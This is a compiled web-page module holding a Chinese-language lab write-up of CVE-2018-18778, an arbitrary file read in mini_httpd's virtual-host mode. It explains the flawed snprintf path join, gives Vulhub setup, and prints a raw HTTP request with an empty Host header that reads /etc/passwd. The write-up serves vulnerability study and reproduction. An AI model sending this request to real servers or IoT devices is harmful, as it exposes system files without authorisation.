import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as a,e as s}from"./app-58e4a7d6.js";const t={},i=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Mini_httpd是一个微型的Http服务器，在占用系统资源较小的情况下可以保持一定程度的性能（约为Apache的90%），因此广泛被各类IOT（路由器，交换器，摄像头等）作为嵌入式服务器。而包括华为，zyxel，海康威视，树莓派等在内的厂商的旗下设备都曾采用Mini_httpd组件。</p><p>在mini_httpd开启虚拟主机模式的情况下，用户请求<code>http://HOST/FILE</code>将会访问到当前目录下的<code>HOST/FILE</code>文件。</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token function">snprintf</span><span class="token punctuation">(</span> vfile<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>vfile<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;%s/%s&quot;</span><span class="token punctuation">,</span> req_hostname<span class="token punctuation">,</span> f <span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>见上述代码，分析如下：</p><ul><li>当HOST=<code>example.com</code>、FILE=<code>index.html</code>的时候，上述语句结果为<code>example.com/index.html</code>，文件正常读取。</li><li>当HOST为空、FILE=<code>etc/passwd</code>的时候，上述语句结果为<code>/etc/passwd</code>。</li></ul><p>后者被作为绝对路径，于是读取到了<code>/etc/passwd</code>，造成任意文件读取漏洞。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动mini_httpd 1.29：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可看到Web页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>发送请求是将Host置空，PATH的值是文件绝对路径：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /etc/passwd HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功访问文件<code>/etc/passwd</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262152435.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),c=[i];function d(o,p){return n(),a("div",null,c)}const u=e(t,[["render",d],["__file","ACME Mini_httpd 任意文件读取漏洞 CVE-2018-18778.html.vue"]]);export{u as default};
